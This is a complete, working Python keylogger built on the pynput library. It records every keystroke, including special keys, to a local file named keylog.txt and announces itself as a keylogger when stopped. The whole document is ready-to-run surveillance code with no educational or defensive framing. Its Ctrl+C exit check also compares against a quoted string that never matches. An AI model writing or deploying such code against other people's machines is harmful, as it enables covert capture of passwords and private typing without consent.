from pynput.keyboard import Listener

# Define the callback function to handle key presses
def on_press(key):
    try:
        # Convert the key to a string
        key_str = str(key.char)
        if key_str == "'\\x03'":  # Ctrl+C to exit
            raise KeyboardInterrupt
        with open("keylog.txt", "a") as f:
            f.write(key_str)
    except AttributeError:
        # Handle special keys (e.g., Shift, Enter, etc.)
        key_str = str(key)
        if key_str.startswith("Key."):
            key_str = key_str[4:]
        with open("keylog.txt", "a") as f:
            f.write(f"[{key_str}]")

# Set up the listener
with Listener(on_press=on_press) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        print("\nKeylogger stopped. Keystrokes saved to 'keylog.txt'.")
